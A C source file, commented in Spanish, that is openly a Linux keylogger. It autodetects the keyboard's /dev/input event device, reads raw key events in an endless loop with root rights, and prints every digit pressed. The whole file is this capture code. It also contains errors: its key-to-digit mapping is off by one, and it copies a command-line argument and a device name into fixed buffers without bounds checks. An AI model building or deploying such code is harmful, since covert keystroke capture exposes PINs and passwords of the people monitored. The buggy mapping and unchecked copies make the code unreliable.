#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <linux/input.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>

void encontrar_teclado(char *ruta_final) {
    FILE *fp = fopen("/proc/bus/input/devices", "r");
    char linea[256];
    int encontrado_teclado = 0; // Bandera para saber si estamos en el bloque correcto

    if (fp == NULL) return;

    while (fgets(linea, sizeof(linea), fp)) {
        // 1. Buscamos el bloque que define un teclado
        // Nota: Agregué "Handlers" en el if para asegurar que no leemos basura antes
        if (strstr(linea, "Name=") && (strstr(linea, "Keyboard") || strstr(linea, "keyboard"))) {
            encontrado_teclado = 1;
        }

        // 2. Si estamos dentro del bloque del teclado, buscamos la línea de Handlers
        if (encontrado_teclado == 1 && strstr(linea, "Handlers=") && strstr(linea, "event")) {
            
            // Buscamos dónde empieza la palabra "event"
            char *p = strstr(linea, "event");
            int i = 0;
            
            // Copiamos caracteres hasta encontrar un espacio o fin de línea
            while (p[i] != ' ' && p[i] != '\n' && p[i] != '\0') {
                ruta_final[i] = p[i];
                i++;
            }
            ruta_final[i] = '\0'; // Cerramos el string
            
            fclose(fp);
            return; // ¡Éxito! Salimos de la función inmediatamente
        }
        
        // 3. Si encontramos una línea vacía (separador de bloques), reseteamos la bandera
        // En /proc/bus/input/devices, los bloques se separan por una línea vacía (solo \n)
        if (strlen(linea) <= 1) {
            encontrado_teclado = 0;
        }
    }
    fclose(fp);
}

int main(int argc, char *argv[]) {
    // Buffers limpios
    char ruta_teclado[20] = {0}; 
    char ruta_completa[50] = "/dev/input/"; // Aumenté un poco el tamaño por seguridad

    // Paso 1: Intentar buscar el teclado automáticamente
    encontrar_teclado(ruta_teclado);

    // Si la función encontró algo (el string no está vacío)
    if (strlen(ruta_teclado) > 0) {
        strcat(ruta_completa, ruta_teclado);
        printf("Autodetectado: %s\n", ruta_completa);
    } 
    // Si no encontró nada y el usuario TAMPOCO pasó argumentos -> Error
    else if (argc < 2) {
        fprintf(stderr, "No pude encontrar el teclado automáticamente.\n");
        fprintf(stderr, "Uso manual: sudo %s /dev/input/eventX\n", argv[0]);
        exit(1);
    }
    // Si el usuario pasó un argumento manual, úsalo (Plan B)
    else {
        strcpy(ruta_completa, argv[1]);
        printf("Usando ruta manual: %s\n", ruta_completa);
    }

    printf("Iniciando Keylogger en %s...\n", ruta_completa);

    // Abrimos el archivo
    int fd = open(ruta_completa, O_RDONLY);
    
    if (fd == -1) {
        perror("Error al abrir el dispositivo (¿Usaste sudo?)");
        exit(1);
    }

    struct input_event ev;

    // Bucle infinito de lectura
    while (1){
        ssize_t bytes = read(fd, &ev, sizeof(ev));

        if (bytes < 0) {
            perror("Perdí la conexión con el teclado");
            break;
        }

        if (ev.type == EV_KEY && ev.value == 1) {
            if(ev.code >= 2 && ev.code <= 10){
                 // Imprime números del 1 al 9
                printf("Tecla: %d\n", ev.code + 2 - 1); // Ajustamos el código para que muestre números del 1 al 9
            } else if (ev.code == 11) {
                printf("Tecla: 0\n"); // El código 11 corresponde al 0
            } 
        }
    }

    close(fd);
    return 0;
}